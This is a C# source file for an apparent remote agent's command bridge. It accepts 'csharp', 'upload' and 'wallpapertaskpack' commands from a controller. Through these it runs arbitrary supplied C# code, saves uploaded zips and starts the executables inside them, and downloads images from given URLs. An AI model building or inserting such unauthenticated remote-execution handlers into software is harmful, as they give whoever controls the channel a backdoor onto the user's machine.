using System.IO.Compression;
using System.Text.Json;
using CommonClassLibrary;
using Payload.Command;
using Payload.Command.WallPaper;
using Payload.Core.Command;
using static CommonClassLibrary.Config;

namespace Payload;

/// <summary>
/// Shared implementation of the legacy Socket.IO agent handlers
/// (csharp / upload / wallpapertaskpack) so both the Socket.IO path and the
/// canonical TLS bridge can invoke the same logic.
/// </summary>
public sealed class LegacyCommandBridge
{
    public static IReadOnlySet<string> LegacyCommandNames { get; } = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
    {
        "csharp",
        "upload",
        "wallpapertaskpack"
    };

    public object Handle(string commandName, JsonElement? arguments)
    {
        return commandName.ToLowerInvariant() switch
        {
            "csharp" => HandleCSharp(arguments),
            "upload" => HandleUpload(arguments),
            "wallpapertaskpack" => HandleWallpaperTaskPack(arguments),
            _ => new { status = "rejected", reason = $"unknown legacy command '{commandName}'" }
        };
    }

    public object HandleCSharp(JsonElement? arguments)
    {
        var code = ReadDataString(arguments);
        if (string.IsNullOrWhiteSpace(code))
        {
            return new { status = "rejected", reason = "csharp payload data is required" };
        }

        var cmd = new CSharpExecuteCommand { TargetCSharpCode = code };
        var outcome = cmd.ExecuteWithResult();
        // status remains "executed" for backward compatibility with consumers that only
        // check status/success; detailed outcome is in executed / executionError.
        return new
        {
            status = "executed",
            command = "csharp",
            executed = outcome.Executed,
            executionError = outcome.ExecutionError,
            stdOut = outcome.StdOut
        };
    }

    public object HandleUpload(JsonElement? arguments)
    {
        var props = ReadUploadProps(arguments);
        if (props is null)
        {
            return new { status = "rejected", reason = "upload payload data is required" };
        }

        props = HandlePath(props);
        var saved = FileHelper.SaveFile(props);
        var patched = InstallPatch(props);
        return new
        {
            status = saved ? "saved" : "save-failed",
            command = "upload",
            path = props.path,
            name = props.name,
            patched
        };
    }

    public object HandleWallpaperTaskPack(JsonElement? arguments)
    {
        var msg = ReadDataString(arguments);
        if (string.IsNullOrWhiteSpace(msg))
        {
            return new { status = "rejected", reason = "wallpapertaskpack payload data is required" };
        }

        switch (msg)
        {
            case "wp":
                CommandManager.Instance.AddWallpaperCmd(Mode.AUTO);
                break;
            case "stwp":
                CommandManager.Instance.GetTaskPack(EnumTask.WallpaperEngine).Pause();
                break;
            case "rewp":
                CommandManager.Instance.AddWallpaperCmd(Mode.RESET);
                break;
            case "savewp":
                ((WallpaperEngineCommand)CommandManager.Instance.GetTaskPack(EnumTask.WallpaperEngine).Command).GetCurrentWallpaper();
                break;
            case "rname":
                RenameAllImage();
                break;
            default:
                HandleWallpaperChannel(msg);
                break;
        }

        return new { status = "executed", command = "wallpapertaskpack", data = msg };
    }

    public void RenameAllImage()
    {
        var dir = Config.Instance.WallpaperEngineCommandImageDir;
        if (!Directory.Exists(dir))
        {
            Directory.CreateDirectory(dir);
            return;
        }

        foreach (var file in new DirectoryInfo(dir).GetFiles())
        {
            if (string.IsNullOrEmpty(file.Extension))
            {
                continue;
            }

            var dest = Path.Combine(file.DirectoryName!, DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss_fff"));
            File.Move(file.FullName, dest);
            Thread.Sleep(1);
            if (File.Exists(file.FullName))
            {
                File.Delete(file.FullName);
            }
        }
    }

    private static bool InstallPatch(UploadProps props)
    {
        var patchUnziped = false;
        if (props.name is null || props.action is null || props.path is null)
        {
            return patchUnziped;
        }

        if (!props.name.ToLower().EndsWith("zip")
            || (!props.action.ToLower().Equals("upgrade") && !props.action.ToLower().Equals("exe")))
        {
            return patchUnziped;
        }

        try
        {
            var patchPath = Path.Combine(props.path, props.name);
            ZipFile.ExtractToDirectory(patchPath, props.path);
            patchUnziped = true;
        }
        catch
        {
            // Preserve legacy silent failure behavior.
        }

        if (!patchUnziped)
        {
            return patchUnziped;
        }

        var exeName = "";
        var allFiles = new DirectoryInfo(props.path).GetFiles("*.exe");
        if (allFiles.Length == 1)
        {
            exeName = allFiles[0].Name;
        }

        new StartProcessFactory(
                new StartProcessCommandProps { ExeName = exeName, TargetWorkSpaceDir = props.path })
            .CreateCommand()
            .Execute();
        return patchUnziped;
    }

    private static UploadProps HandlePath(UploadProps props)
    {
        var action = (props.action ?? string.Empty).ToLowerInvariant();
        if (action is "upgrade" or "exe")
        {
            props.path = Path.Combine(
                Config.Instance.TargetUpgradeDir,
                $"{DateTime.Now:yyyy_MM_dd_HH_mm_ss}_{(action == "upgrade" ? "patch" : "exe")}");
        }

        return props;
    }

    private static void HandleWallpaperChannel(string cmd)
    {
        if (cmd.StartsWith("dl", StringComparison.Ordinal))
        {
            var parts = cmd.Split(' ', 2, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length < 2)
            {
                return;
            }

            var url = parts[1];
            var dest = Path.Combine(
                Config.Instance.WallpaperEngineCommandImageDir,
                DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss_fff"));
            new ImageHelper().SaveImage(url, dest);
        }
    }

    private static string? ReadDataString(JsonElement? arguments)
    {
        if (arguments is null)
        {
            return null;
        }

        var args = arguments.Value;
        if (args.ValueKind == JsonValueKind.String)
        {
            return args.GetString();
        }

        if (args.ValueKind == JsonValueKind.Object && args.TryGetProperty("data", out var data))
        {
            return data.ValueKind == JsonValueKind.String ? data.GetString() : data.ToString();
        }

        return null;
    }

    private static UploadProps? ReadUploadProps(JsonElement? arguments)
    {
        if (arguments is null)
        {
            return null;
        }

        var args = arguments.Value;
        JsonElement payload = args;
        if (args.ValueKind == JsonValueKind.Object && args.TryGetProperty("data", out var data))
        {
            payload = data;
        }

        if (payload.ValueKind != JsonValueKind.Object)
        {
            return null;
        }

        // Support either raw byte[] JSON (base64 string) or an explicit fileBase64 field.
        var props = JsonSerializer.Deserialize<UploadProps>(payload.GetRawText(), new JsonSerializerOptions
        {
            PropertyNameCaseInsensitive = true
        });

        if (props is null)
        {
            return null;
        }

        if ((props.file is null || props.file.Length == 0)
            && payload.TryGetProperty("fileBase64", out var b64)
            && b64.ValueKind == JsonValueKind.String)
        {
            props.file = Convert.FromBase64String(b64.GetString() ?? string.Empty);
        }

        return props;
    }
}
